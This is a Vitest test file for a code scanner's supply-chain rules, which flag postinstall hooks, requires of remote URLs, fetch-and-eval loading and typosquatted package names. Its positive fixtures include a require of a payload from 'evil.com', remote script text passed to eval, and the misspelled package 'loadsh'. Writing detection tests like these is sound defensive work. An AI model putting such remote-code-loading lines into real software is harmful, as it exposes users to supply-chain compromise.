import { describe, it, expect } from "vitest";
import { scanFiles } from "@/scanner/engine";
import { allRules, supplyChainRules } from "@/scanner/rules";
import type { FileContent } from "@/types/scan";

describe("supply-chain rules", () => {
  it("all 4 supply-chain rules are present in allRules", () => {
    const scInAll = allRules.filter((r) => r.category === "supply-chain");
    expect(scInAll).toHaveLength(4);
    expect(scInAll.map((r) => r.id).sort()).toEqual(["SC001", "SC002", "SC003", "SC004"]);
  });

  it("SC001 fires on postinstall script", () => {
    const files: FileContent[] = [{ path: "package.json", content: `"postinstall": "node setup.js"` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC001")).toBe(true);
  });

  it("SC001 does not fire on normal scripts", () => {
    const files: FileContent[] = [{ path: "package.json", content: `"start": "node index.js"` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC001")).toBe(false);
  });

  it("SC002 fires on dynamic require of URL", () => {
    const files: FileContent[] = [{ path: "plugin.ts", content: `require("https://evil.com/payload.js")` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC002")).toBe(true);
  });

  it("SC002 does not fire on local require", () => {
    const files: FileContent[] = [{ path: "plugin.ts", content: `require("./local-module")` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC002")).toBe(false);
  });

  it("SC003 fires on fetch-and-eval pattern", () => {
    const files: FileContent[] = [{ path: "loader.ts", content: `const code = await fetch("https://cdn.example.com/script.js").then(r => r.text()); eval(code);` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC003")).toBe(true);
  });

  it("SC003 does not fire on normal fetch", () => {
    const files: FileContent[] = [{ path: "loader.ts", content: `const data = await fetch("https://api.example.com/data").then(r => r.json());` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC003")).toBe(false);
  });

  it("SC004 fires on typosquatting package name", () => {
    const files: FileContent[] = [{ path: "package.json", content: `"loadsh": "^4.0.0"` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC004")).toBe(true);
  });

  it("SC004 does not fire on legit package name", () => {
    const files: FileContent[] = [{ path: "package.json", content: `"lodash": "^4.17.21"` }];
    const matches = scanFiles(files, supplyChainRules);
    expect(matches.some((m) => m.ruleId === "SC004")).toBe(false);
  });
});
